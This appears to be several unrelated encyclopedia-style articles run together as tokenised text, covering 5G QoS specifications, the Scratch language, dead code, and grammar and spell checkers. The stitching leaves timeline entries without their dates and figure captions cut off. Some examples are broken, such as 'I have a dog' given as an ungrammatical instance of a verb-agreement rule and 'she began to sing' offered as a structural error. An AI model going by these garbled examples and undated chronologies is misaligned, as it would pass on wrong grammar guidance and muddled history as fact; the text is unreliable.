Delay , jitter and packet loss are some metrics used to determine QoS. QoE has different concerns : service accessibility , wait times , users leaving because of poor features , response time , seamless interactivity , etc .
QoE depends on user expectations , which can change with evolving technology and applications .
A 5 % packet loss could have little impact on a cloud service , but even a 0.5 % packet loss could result in a huge throughput reduction for another application .
It 's therefore clear that QoE should consider user and application perspectives , and not just network performance metrics .
For example , on the same network with high bitrates an AR application might experience low QoE but a file download has high QoE even when latency or transport continuity are relatively poor .
Even within AR , we can discern a variety of applications , each with its own QoE characteristics .
What are the relevant specifications that detail 5 G QoS ?
An overview of the 5 G QoS model and architecture is given in TS 38.300 , section 12 .
A more detailed and complete description of QoS is in TS 23.501 , section 5.7 .
These two documents are good starting points for beginners .
From the perspective of 5 G System ( 5GS ) procedures , QoS details are covered in TS 23.502 .
QoS flow binding and parameter mapping are covered in TS 29.513 .
QoS Information Elements ( IEs ) are detailed in TS 38.413 .
The mapping of QoS flows to Radio Bearers ( RBs ) is done at the Service Data Adaptation Protocol ( SDAP ) sublayer , which is covered in TS 37.324 .
3GPP approves the first specifications for 5 G , called " early drop " of Release 15 .
The focus of this release is the Non - Standalone ( NSA ) mode of operation using Dual Connectivity ( DC ) between LTE and 5 G NR .
At this time , SDAP specification TS 37.324 is at v1.2.0 and not yet approved for Release 15 .
SDAP specification TS 37.324 , v15.0.0 is approved for Release 15 .
This date coincides with the " main drop " of Release 15 specifications .
This release enables the Standalone ( SA ) mode of operation based on 5 G Core .
SDAP sublayer in gNB and UE maps QoS flows to DRBs .
Modern application traffic , particularly concerning mobile devices , often passes through enterprise networks , the Internet and cellular mobile networks .
Whereas 3GPP uses QoS Class Identifiers ( QCIs ) and 5 G QoS Identifiers ( 5QIs ) , IETF uses Differentiated Services Code Point ( DSCP ) markings .
Henry and Szigeti therefore published an IETF Internet - Draft titled Diffserv to QCI Mapping .
Version 04 of this draft was published in April 2020 but it expires in October 2020 , without any further continuity .
Specification TS 23.501 is updated for Release 16 .
Among QoS - specific changes are Deterministic QoS for Time - Sensitive Communication ( TSC ) ; QoS support for Multi - Access PDU Session ; and New 5QIs for Enhanced Framework for Uplink Streaming .
QoS information management at SMF .
Source : Cisco 2020 , fig .
4 .
As an example from an implementation perspective , we note Cisco 's publication of document titled Ultra Cloud Core 5 G Session Management Function , Release 2020.02 - Configuration and Administration Guide .
This guide details the 5 G QoS model and how it 's managed by SMF .
It explains default bearer QoS handling for 4 G , 5 G and Wi - Fi sessions .
Scratch the mascot ( top ) and logo ( bottom ) .
Source : Gaadkii 2021 .
Scratch is a visual block - based programming language designed for children aged 8 - 16 .
Children can create games , animations and stories in a fun - filled manner while also learning to reason and think creatively .
Scratch is also an online community where creators can share their projects and be inspired by other projects .
Scratch is available in more than 150 countries in more than 60 languages .
Its usage is license free .
Scratch itself is open source .
It was developed and overseen by the Scratch Foundation .
Scratch has been called " the YouTube of interactive media .
" Scratch has inspired other visual programming languages , such as ScratchJr for ages 5 - 7 , Snap !
, mBlock , Stencyl and MIT App Inventor .
Given dozens of programming languages , why do I need Scratch ?
An introduction to Scratch .
Source : Scratch Ed 2011 .
Many popular programming languages are text - based .
Programmers have to type in the program code .
They need to learn and remember the language syntax .
For beginners , making syntax errors is a common problem .
A text - based interface is less accessible and less fun for children .
In contrast , Scratch is designed for children aged 8 - 16 .
It can be taught at schools for students across all disciplines , including math , computer science , language arts , and social studies .
This is important for today 's economy where learning to code is part of computer literacy .
Because Scratch is visual , it 's less intimating than text - based programming languages .
Programs in Scratch are created by drag - and - drop actions on colourful blocks .
The use of shapes and colours acts as visual cues to help programmers create , edit or understand Scratch programs more easily .
In fact , shapes fit together like a jigsaw puzzle .
Its designers claim that Scratch is more tinkerable , more meaningful , and more social than other programming environments .
Research has shown that Scratch enables students to grasp computational thinking concepts such as parallelism , synchronization , flow control , user interactivity , data representation , abstraction and problem decomposition .
What types of projects can I create with Scratch ?
The main or popular project types in Scratch are : Games : Games are the most common type , giving their creators a large fan following .
Even classics such as Pacman and Mario have been recreated in Scratch .
Animations : Using costume changes and movements , animations can be easily created .
Music : MIDI sound bank allows programmers to play up to 128 instruments .
Volume and tempo can be adjusted .
It 's also possible to import a song and play it .
Art : Interactive art is one of the purposes for which Scratch was designed .
More recently , non - interactive art is becoming common , though less programming may be involved in creating them .
Stories : Not very common since many can be considered as animations .
Stories could be adventures or feature many costumes and backdrops .
Simulations : Not that common but high quality projects involving physics , weather , gravity and 3D simulations have been created .
Operating systems and engines are two common themes .
Other types include tutorials , advertisements , sprite packs , slideshows , petitions , 100 % pen , interviews , etc .
What are some essential Scratch programming terms ?
A sample script using different types of blocks .
Source : Adapted from Scratch Wiki 2021f .
From a complete glossary for Scratch , we highlight a few essential terms : Stage : Area where the project is displayed when active .
Backdrop : Background of the stage .
Block : Programming command that can be dragged and dropped into the code area .
Code Area : Area where scripts are edited .
Script : A stack of blocks make up a script .
It determines how a sprite interacts with other sprites and the backdrop .
Sprite : Character or object on the stage that performs actions controlled by one or more scripts .
Clone : A copy of a sprite .
Costume : Appearance of a sprite .
Often , subtle variations of a sprite can be used to create animations .
Bubble : A speech bubble or a thought bubble signifies what a sprite is speaking or thinking .
Scrolling : Action of sliding a sprite across the stage .
Broadcast : A message sent through the Scratch program .
It allows people to communicate with one another .
Event : Key presses or mouse button clicks are example events .
It can be used to trigger scripts .
Studio : A place to group and organize multiple projects .
Pen : Allows us to draw on the stage .
What 's the anatomy of the Scratch IDE ?
The anatomy of the Scratch IDE .
Source : Sweigart 2021 .
The main areas of the IDE include the Stage , the Block Palette and the Code Area .
The Stage is where the currently selected sprite appears .
When the program runs , the results are displayed on the stage .
The stage can be maximized to full screen .
Just below the stage is the list of sprites that one can choose .
When a sprite is selected , the scripts associated with it appear in the Code Area .
These scripts can be created or edited by drag - and - drop actions of blocks from the Block Palette .
The costumes tab allows programmers to change the look of a stage and thereby create visual effects and animations .
The Sounds tab enables attaching sounds and music to the spring .
Which are the different shapes and categories of blocks in Scratch ?
Shapes and categories of scratch blocks .
Source : Adapted from hello.mrs.green 2020 and Wikipedia 2021 .
Blocks come in different shapes and categories .
Each category comes in a different colour .
The block shape represents a certain context of usage .
For example , Hat Blocks occur at the start of a script whereas Cap Blocks occur at the end of a script .
Their unique shapes mean that they ca n't be mistakenly used elsewhere within the script .
Stack Blocks perform the main actions .
Boolean Blocks return true or false .
Reporter Blocks report fixed numbers , strings or variables .
C Blocks ( also called Wrap Blocks ) wrap other blocks and are in the control category .
Some C Blocks are capped at the bottom .
The block category represents a certain type of functionality .
Categories include Motion Blocks , Looks Blocks , Sound Blocks , Events Blocks , Control Blocks , Sensing Blocks , Operators Blocks , Variables Blocks , My Blocks , and Extensions .
With My Blocks , programmers can define a custom script and call it with inputs from other scripts .
Use of My Blocks reduces the overall project size .
How do I get started with programming on Scratch ?
Create an account on the Scratch website and start creating projects online .
Perhaps the easiest way to work with Scratch is to create and edit projects via a web browser .
No installation is required .
Those who wish to work offline(withoutInternetconnection) , can download Scratch .
Installations are available for Windows , Macos , ChromeOS and Android ( tablets only ) .
Scratch projects created from these installed apps ca n't be directly shared with the online community .
You can , however , export a project , and then upload and share online .
The official documentation is on the Scratch Wiki .
You can explore Scratch projects shared by others .
Participate in the Scratch discussion forum .
The Scratch Ed channel on YouTube has many videos of tutorials , examples , events and workshops .
Two useful books for beginners are Scratch 3 Programming Playground by Al Sweigart and Scratch Programming in Easy Steps by Sean McManus .
The latter book does n't cover Scratch 3.0 but its examples are available online .
Advanced programmers who wish to contribute to Scratch 's open source codebase can find the code on GitHub .
The idea of using programming as a skill and a learning tool probably began with Seymour Papert in the 1970s .
He created the LOGO programming language .
Language commands control movements of a digital robot .
This helps children grasp geometry .
A pen is used to draw shapes on the screen .
LOGO and its turtle graphics were subsequently widely adopted in UK schools .
Scratch 0.1 came out in 2003 .
Source : Scratch Wiki 2021i .
Mitch Resnick and John Maeda of MIT , and Yasmin Kafai of UCLA propose the idea of Scratch to the National Science Foundation ( NSF ) .
Resnick is part of the Lifelong Kindergarten Group of MIT Media Labs .
With an NSF grant , they create Scratch 0.1 by October .
This version does n't have a Block Palette and the blocks are more square shaped .
The First Scratch website is live .
Elsewhere , it 's reported that the Scratch website was publicly launched in May 2007 .
Scratch 1.0 came out in January 2007 .
Source : Scratch Wiki 2014 .
Scratch 1.0 has been released .
It 's also the first version released to the public .
The scratch layout in this version resembles a version from January 2005 .
Thus , we may state that the application has reached a good level of maturity .
Scratch 1.4 has been released .
Earlier versions include v1.1 ( May 2007 ) , v1.2 ( Dec 2007 ) , and v1.3 ( Sep 2008 ) .
A screenshot of Scratch 2.0 offline editor .
Source : Scratch Wiki 2019 .
Scratch 2.0 has been released .
It has got a new user interface .
Among its new features are procedures , cloning , cloud data , vector graphics , show / hide lists , and sound editor .
The offline editor of this version continues to be available even in April 2021 .
Rendering in Scratch 2.0 ( left ) versus Scratch 3.0 ( right ) .
Source : Pasternak 2019 .
Since Scratch 2.0 was based on Flash , and Flash is no longer preferred on the web , Google proposed a partnership with MIT Media Lab to redesign Scratch .
By 2015 , many other visual programming languages ( Code.org , App Inventor , MakeCode ) are already using a JavaScript library called Blockly .
Scratch adopts Blockly .
The redesigned UI and blocks are released as part of Scratch 3.0 ( Jan 2019 ) .
Blocks added or replaced in Scratch 3.0 .
Source : NitroCipher 2018 .
Scratch 3.0 has been released .
Scratch 2.0 projects are compatible with the new version .
The Usability of the app has improved .
Pen Blocks and Music Blocks are moved to Extensions .
Stage is on the right , unlike Scratch 2.0 that had it on the left .
The Scratch community has close to 75 million shared projects , 70 million registered users , 448 million comments , and 29 million studios .
In March , the site received 613 million pageviews and 29 million unique visitors .
In the TIOBE Index , Scratch ranks at position 22 in terms of popular programming languages .
In April 2020 , it was within the top 20 .
Examples of dead code .
Source : Adapted from Seguy 2016 and Knoop et al .
1994 .
A dead code is any code that 's never executed , or if executed , the execution has no effect on the application 's behaviour .
The dead code adds unnecessary complexity to the codebase .
It makes the codebase more difficult to understand and maintain in the long run .
It impacts performance and security .
In some cases , due to poor software engineering practices , dead code can " come back to life " and cause catastrophic failures .
It 's therefore recommended to remove the dead code .
Tools and techniques are available to help developers get rid of dead code .
But developers tend to leave them around rather than remove them .
It 's been said that deleting dead code is not a technical problem ; it is a problem of mindset and culture .
What 's the definition of a dead code ?
The Dead code has a few possible definitions .
Source : Boomsma 2012 , fig .
2.1 .
A dead code is any code that has no effect on the application 's behaviour .
This is a simple and useful definition .
Looking into the details , we identify some alternatives to this definition .
A code that is unnecessarily executed is called a redundant code .
This would include variable assignments or function returns that are subsequently never used .
A subset of this may be called partially dead code that refers to code that 's essential only on some program paths .
Code that ca n't be reached or executed on any program path is called unreachable code .
This could happen if there 's an unconditional function return and there 's a code that follows the return statement .
The code that 's commented is another example .
A superset of this is an unused code that could be executed but it 's not executed because the user never triggers it .
What are the different types of dead code ?
R8 for Android identifies and removes unused classes and methods from libraries .
Source : Android Developers 2021 , fig .
1 .
Dead code can be of the following types : Dead Types : Types are defined but not used anywhere .
This includes types used by other types , but the latter themselves are not used anywhere .
Public types should not be considered dead since they may be called by client code .
Dead Methods : Like dead types but applicable for methods .
Dead Fields : Unused fields or fields that are only initialized but not used anywhere in the code .
Dead fields include attributes of classes common in object - oriented programming languages .
Dead Parameters : Maybe considered as a special case of dead fields .
For example , a function accepts four parameters but only three are used by the function .
Since public types , methods and fields can be called by client code , we do n't consider them as dead during static analysis or compilation .
However , a linker can still identify dead code and remove them if they see that the client code is not calling them .
An example of this is the R8 code shrinker that developers use in Android projects .
What problems can dead code cause ?
The dead code introduces unnecessary complexity and confusion .
People who maintain code are usually not the same as those who created it .
With dead code around , it 's hard to know what 's safe to delete or update .
Developers may even maintain dead code ( and their test cases ) without realizing that it 's a waste of effort .
From a design perspective , dead code increases or preserves coupling among classes .
This in turn makes code refactoring more difficult .
Dead code takes up extra space .
The program size is larger and so too is its runtime footprint .
Dead code that executes without changing the application 's functional behaviour but may affect performance .
CPU cycles are spent on executing redundant code .
Dead code that has n't been touched for a long time may also contain security issues that could be exploited by hackers .
It 's smarter to delete such code than to maintain it .
A patent is infringed only if the code that implements the claimed invention actually executes .
Therefore , patent holders will have a weaker case if some of their code is dead .
This is yet another reason to identify dead code .
Could you share some real - world instances of dead code ?
A high - profile example is that of Knight Capital Group , that lost $ 440 million in a single day on the NYSE due to the dead code .
This happened on August 1st , 2012 , though the dead code had been unused since 2003 .
The problem was triggered because a dead feature flag was repurposed for some new code .
This unintentionally activated the dead code that had been designed for only test environments .
The codebase had also been refactored without adequate regression testing .
Moreover , deployment was done manually without a proper reviewal process .
In 2014 , Apple fixed a security vulnerability that was attributed to a copy - paste edit that led to dead code .
A duplicate line of code allowed an attacker to bypass an authentication check , which became a dead code .
Static code analysis would have caught this problem .
Informal peer review , formal code inspection , test coverage ( line and path coverage ) and training developers are other ways this could have been prevented or caught earlier .
Why do we have a dead code ?
Themes and sub - themes relevant to the dead code .
Source : Romano et al .
2020 , fig .
4 .
Dead code arises due to software maintenance and software aging .
For example , a new fragment of code might make another code fragment die .
Developers are either unaware of this or think that such a code may be needed again someday .
When software ages , dead code due to obsolete features is a common reason .
Where a codebase is inherited from another company , we can have an inherited dead code .
When developers recognize the dead code , they might comment on it or add comments to flag it .
They may remove it only if it 's low risk and low cost .
Sometimes a code is created dead with the expectation that it could be used in the future .
In classes , the use of getters and setters is such an example .
Unclear or incomplete specifications are further reasons for the dead code .
Code reuse can cause dead code since not all interfaces or functions may be used .
Sometimes the dead code is active during testing but not in production .
Developers therefore do n't consider removing it .
On the contrary , the lack of automated regression testing makes developers wary of any refactoring .
What are some tools and techniques to eliminate dead codes ?
An easy way to find and eliminate dead code is a good IDE .
Unused files can also be removed .
Unnecessary classes can be inlined .
The Class hierarchy could collapse .
Eclipse , Findbugs , PMD , and NDepend are some useful IDEs or tools .
Languages such as JavaScript have good linting tools to catch dead code .
For Go , Grind package can be considered .
For R , there 's ` rco ` .
For Python , there 's Vulture for static code analysis .
Although Python is a dynamic language , Vulture can improve code quality .
Where developers suspect dead code , they can log messages .
More generally , it 's good practice to log API calls .
If such messages appear at runtime , we can be assured that the code is not entirely dead .
However , the absence of these messages in the log does n't guarantee that the code is dead .
For JavaScript frontend code , minifiers remove dead code for production builds .
Likewise , there are options for C++ compilers and linkers that eliminate dead code .
These reduce program size and perhaps improve performance .
However , they do n't solve the problem of dead code at the source , which implies that software maintenance continues to be complex .
In this decade , there 's research towards better compilers , program certification and program optimization .
For example , Rosen 's 1977 paper titled High - Level Data Flow Analysis adopts directed graphs as an analysis tool .
These research initiatives facilitate dead code elimination .
Based on techniques for partial redundancy elimination , Knoop et al .
present an optimal method for partial dead code elimination .
Their method is optimal in the sense that any remaining partially dead code ca n't be eliminated without changing the code structure or its semantics .
In a book about software refactoring , Brown et al .
take note of the " unused code frozen in an ever - changing design .
" They call this lava flow .
Martin Fowler , in his book titled Refactoring : Improving the Design of Existing Code , identifies 22 code smells and suggests ways to remove them .
However , he does n't explicitly mention the dead code as a code smell .
Bolton and Ung filed for a patent with the title Partial dead code elimination optimizations for program code conversion .
They identify partially dead register definitions that can be eliminated towards more optimized intermediate representation of the code .
As part of Android Studio 3.3 beta , Google released R8 for code shrinking .
With R8 , the APK size is reduced .
R8 gets rid of unused code and resources .
It also does code minification to save space .
Proguard is another tool that does this , but R8 does it faster while achieving similar results .
In an analysis of code smells , dos Reis et al .
include dead code as one of the code smells .
From the 83 studies selected for the analysis , they found that 4.8 % contained dead code .
The most prominent code smell is the God Class , presented in 51.8 % of the studies .
Summary of approaches to Grammar Error Correction ( GEC ) .
Source : Source : Adapted from Ailani et al .
2019 , figs .
1 - 4 .
A well - written article with correct grammar , punctuation and spelling along with an appropriate tone and style to match the needs of the intended reader or community is always important .
Software tools offer algorithm - based solutions for grammar and spell checking and correction .
Classical rule - based approaches employ a dictionary of words along with a set of rules .
Recent neural network - based approaches learn from millions of published articles and offer suggestions for appropriate choice of words and ways to phrase parts of sentences to adjust the tone , style and semantics of the sentence .
They can alter suggestions based on the publication domain of the article , like academic , news , etc .
Grammar and spelling correction are tasks that belong to a more general NLP process called lexical disambiguation .
What is a software grammar and spell checker , its general tasks and uses ?
Illustrating grammar and spell checks and suggested corrections .
Source : Devopedia 2021 .
A grammar and spell checker is a software tool that checks a written text for grammatical mistakes , appropriate punctuation , misspellings , and issues related to sentence structure .
More recently , neural network - based tools also evaluate tone , style , and semantics to ensure that the writing is flawless .
Often , such tools offer a visual indication by highlighting or underlining spelling and grammar errors in different colors ( often red for spelling and blue for grammar ) .
Upon hovering or clicking on the highlighted parts , they offer appropriately ranked suggestions to correct those errors .
Certain tools offer a suggestive corrected version by displaying correction as strikeout in an appropriate color .
Such tools are used to improve writing , produce engaging content , and for assessment and training purposes .
Several tools also offer style correction to adapt the article for specific domains , like academic publications , marketing , and advertising , legal , news reporting , etc .
However , till today , no tool is a perfect alternative to an expert human evaluator .
What are some important terms relevant to a grammar and spell checker ?
The following NLP terms and approaches are relevant to grammar and spell checker : Part - of - Speech ( PoS ) tagging marks words as noun , verb , adverb , etc .
based on definition and context .
Named Entity Recognition ( NER ) is labeling a sequence of text into predefined categories such as name , location , etc .
Labels help determine the context of words around them .
A Confusion Set is a set of probable words that can appear in a certain context , e.g. set of articles before a noun .
N - Gram is a sub - sequence of n words or tokens .
For example , " The sun is bright " has these 2-grams : { " the sun " , " sun is " , " is bright " } .
Parallel Corpus is a collection of text placed alongside its translation , e.g. text with errors and its corresponding corrected version(s ) .
The Language Model ( LM ) determines the probability of distribution over a sequence of words .
It says how likely it is a particular sequence of words is .
Machine Translation ( MT ) is a software approach to translate one sequence of text into another .
In grammar checking , this refers to translating erroneous text into correct text .
What are the various types of grammar and spelling errors ?
Types of grammar and spelling errors .
Source : Soni and Thakur 2018 , fig .
3 .
We describe the following types : Sentence Structure : Parts of speech are organized incorrectly .
For example , " she began to sing " shows misplaced ' to ' or ' -ing ' .
Dependent clause without the main clause , run - on sentences due to missing conjunction , or missing subject are some structural errors .
Syntax Error : Violation of rules of grammar .
These can be in relation to subject - verb agreement , wrong / missing article or preposition , verb tense or verb form error , or a noun number error .
Punctuation Error : Punctuation marks like comma , semi - colon , period , exclamation , question mark , etc .
are missing , unnecessary , or wrongly placed .
Spelling Error : A Word is not known in the dictionary .
Semantic Error : Grammar rules are followed but the sentence does n't make sense , often due to a wrong choice of words .
" I am going to the library to buy a book " is an example where ' bookstore ' should replace ' library ' .
Rule - based approaches typically ca n't handle semantic errors .
They require statistical or machine learning approaches , which can also flag other types of errors .
Often , a combination of approaches leads to a good solution .
What are classical methods for implementing grammar and spell checkers ?
Real word spelling correction .
Source : Jurafsky 2019 .
Classical methods of spelling correction match words against a given dictionary , an approach alluded by critiques to being unreliable as it ca n't detect incorrect use of correctly spelled words ; or correct words not in the dictionary , like technical words , acronyms , etc .
Grammar checkers use hand - coded grammar rules on PoS tagged text for correct or incorrect sentences .
For instance , the rule ` I + Verb ( 3rd person , singular form ) ` corresponds to the incorrect verbform usage , as in the phrase " I have a dog .
" These methods provide detailed explanations of flagged errors , making them helpful for learning .
However , rule maintenance is tedious and devoid of context .
Statistical approaches validate parts of a sentence ( n - grams ) against their presence in a corpus .
These approaches can flag words being used out of context .
However , it 's challenging to provide detailed explanations .
Their efficiency is limited to the choice of corpora .
The noisy channel model is one statistical approach .
A LM based on trigrams and bigrams gives better results than just unigrams .
Where rare words are wrongly corrected , using a blacklist of words or a probability threshold can help .
What are Machine Learning - based methods for implementing grammar and spell checkers ?
ML - based approaches are either Classification ( discriminative ) or Machine Translation ( generative ) .
Classification approaches work with well - defined errors .
Each error type ( article , preposition , etc .
) requires training of a separate multi - class classifier .
For example , a proposition error classifier takes n - grams associated with propositions in a sentence and outputs a score for every candidate proposition in the confusion set .
Contextual corrections also consider features like PoS and NER .
A model can be a linear classifier like a Support Vector Machine ( SVM ) , an n - gram LM - based or Naïve Bayes classifier , or even a DNN - based classifier .
Machine Translation approaches can be Statistical Machine Translation ( SMT ) or Neural Machine Translation ( NMT ) .
Both these use parallel corpora to train a sequence - to - sequence model , where text with errors translates to corrected text .
NMT uses encoder - decoder architecture , where an encoder determines a latent vector for a sentence based upon the input word embeddings .
The decoder then generates target tokens from the latent vector and relevant surrounding input and output tokens ( attention ) .
These benefit from transfer learning and advancements in transformer - based architecture .
Editor models reduce training time by outputting edits to input tokens from a reduced confusion set instead of generating target tokens .
How can I train an NMT model for grammar and spell checking ?
Training an NMT for GEC .
Source : Adapted from Naghshnejad et al .
2020 , fig .
3 , fig .
5 , table 4 .
In general , NMT requires training an encoder - decoder model using cross - entropy as the loss function by comparing maximum likelihood output to the gold standard correct output .
To train a good model requires a large number of parallel corpora and compute capacity .
Transformers are attention - based deep seq2seq architectures .
Pre - trained language models generated by transformer architectures like BERT provide contextual embeddings to find the most likely token given the surrounding tokens , making it useful to flag contextual errors in an n - gram .
Transfer learning via fine tuning weights of a transformer using the parallel corpus of incorrect to correct examples makes it suitable for GEC use .
Pre - processing or pre - training with synthetic data improves the performance and accuracy .
Further enhancements could be to use separate heads for different types of errors .
Editor models are better as they output edited sequences instead of corrected versions .
Training and testing of editor models require the generation of edited sequences from source - target parallel texts .
What datasets are available for training and evaluation of grammar and spell check models ?
MT or classification models need datasets with annotated errors .
NMT requires a large amount of data .
Lang 8 , the largest available parallel corpora , has 100,051 English entries .
Corpus of Linguistic Acceptability ( CoLA ) is a dataset of sentences labeled as either grammatically correct or incorrect .
It can be used , for example , to fine tune a pre - trained model .
GitHub Typo Corpus is harvested from GitHub and contains errors and their corrections .
Benchmarking data in the Standard Generalized Markup Language ( SGML ) format is available .
Sebastian Ruder offers a detailed list of available benchmarking test datasets along with the various models ( publications and source code ) .
Noise models use transducers to produce erroneous sentences from correct ones with a specified probability .
They induce various error types to generate a larger dataset from a smaller one , like replacing a word from its confusion set , misplacing or removing punctuations , inducing spelling , tense , noun number , or verb form mistakes , etc .
Round - trip MT , such as English - German - English translation , can also generate parallel corpora .
Wikipedia edit sequences offer millions of consecutive snapshots to serve as source - target pairs .
However , only a tiny fraction of those edits are language related .
How do I understand or evaluate the performance of grammar and spell checkers ?
ERRor ANnotation Toolkit ( ERRANT ) enabled suggestions with explanation .
It automatically annotates parallel English sentences with error type information , thereby standardizing parallel datasets and facilitating detailed error type evaluation .
Training and evaluation require comparing the output to the target gold standard and giving a numerical measure of effectiveness or loss .
Editor models have an advantage as the sequence length of input and output is the same .
Unequal sequences need alignment with the insertion of empty tokens .
The Max - Match ( \(M^2\ ) ) scorer determines the smallest edit sequence out of the multiple possible ways to arrive at the gold standard using the notion of Levenshtein distance .
The evaluation happens by computing precision , recall , and F1 measuring between the set of system edits and the set of gold edits for all sentences after aligning the sequences to the same length .
Dynamic programming can also align multiple sequences to the gold standard when there is more than one possible correct outcome .
Could you mention some tools or libraries that implement grammar and spell checking ?
GNU Aspell is a standard utility used in GNU OS and other UNIX - like OS .
Hunspell is a spell checker that 's part of popular software such as LibreOffice , OpenOffice.org , Mozilla Firefox 3 & Thunderbird , Google Chrome , and more .
Hunspell itself is based on MySpell .
Hunspell can use one or more dictionaries , stemming , morphological analysis , and Unicode text .
Python packages for spell checking include ` pyspellchecker ` , ` textblob ` and ` autocorrect ` .
A search for " grammar spell " on GitHub brings up useful dictionaries or codes implemented in various languages .
There 's a converter from British to American English .
Spellcheckr is a JavaScript implementation for web frontends .
Deep learning models include Textly - DRF - API and GECwBERT .
Many online services or offline software also exist : WhiteSmoke from 2002 , LanguageTool from 2005 , Grammarly from 2009 , Ginger from 2011 , Reverso from 2013 , and Trinka from 2020 .
Trinka focuses on an academic style of writing .
Grammarly focuses on suggestions in terms of writing style , clarity , engagement , delivery , etc .
The Abbreviation ABBT maps the incorrect word ' absorbant ' to the correct word ' absorbent ' .
Source : Blair 1960 .
Blair implements a simple spelling corrector using heuristics and a dictionary of correct words .
spellings are associated with the corrected ones via abbreviations that indicate similarity between the two .
Blair notes that this is in some sense a form of pattern recognition .
In one experiment , the program successfully corrected 89 of 117 misspelled words .
In general , research interest in spell checking and correction began in the 1960s .
R. E. Gorin writes Ispell in the PDP-10 assembly .
Ispell became the main spell - checking program for UNIX .
Ispell is also credited with introducing the generalized affix description system .
Much later , Geoff Kuenning implemented a C++ version with support for many European languages .
This is called International Ispell .
GNU Aspell , MySpell and Hunspell are other software inspired by Ispell .
Evolution of GEC .
Source : Naghshnejad et al .
2020 , fig 1 .
In the 1980s , GEC systems were syntax - based systems , such as EPISTLE .
They determine the syntactic structure of each sentence and the grammatical functions fulfilled by various phrases .
They detect several classes of grammatical errors , such as disagreement in numbers between the subject and the verb .
This decade focuses on simple linear classifiers to flag incorrect choice of articles or statistical methods to identify and flag use of commonly confused words .
Confusion can be due to identical sounding words , typos etc .
Rule - based methods evolved in the 2000s .
Rule generation is based on parse trees , designed heuristically or based on linguistic knowledge or statistical analysis of erratic texts .
These methods do n't generalize to new types of errors .
New rules need to be constantly added .
The mid-2000s saw methods to record and create aligned corpora of pre- and post - editing ESL ( English as a Second Language ) writing samples .
SMTs offer improvements in identifying and correcting writing errors .
GEC sees the use of semantic and syntactic features including PoS tags and NER information for determining the applicable correction .
Support Vector Machines ( SVMs ) , n - gram LM - based and Naïve Bayes classifiers are used to predict the potential correction .
DNN - based classifier approaches were proposed in the 2000s and early 2010s .
However , a specific set of error types has to be defined .
Typically , only well - defined errors can be addressed with these approaches .
SMT models learn mappings from source text to target text using a noisy channel model .
SMT - based GEC models use parallel corpora of erratic text and grammatically correct versions of the same text in the same language .
Open - source SMT engines are available online and include Moses , Joshua and cdec .
Neural Machine Translation ( NMT ) shows better prospects by capturing some learner errors missed by SMT models .
This is because the NMT can encode structural patterns from training data and is more likely to capture an unseen error .
With the advent of attention - based transformer architecture in 2017 , its application to GEC gives promising results .
Methods to improve the training data by text augmentation of various types , including cyclic machine translation , emerge .
These improve the performance of GEC tools significantly and enable better flagging of style or context - based errors or suggestions .
Predicting edits instead of tokens allows the model to pick the output from a smaller confusion set .
Thus , editor models lead to faster training and inference of GEC models .
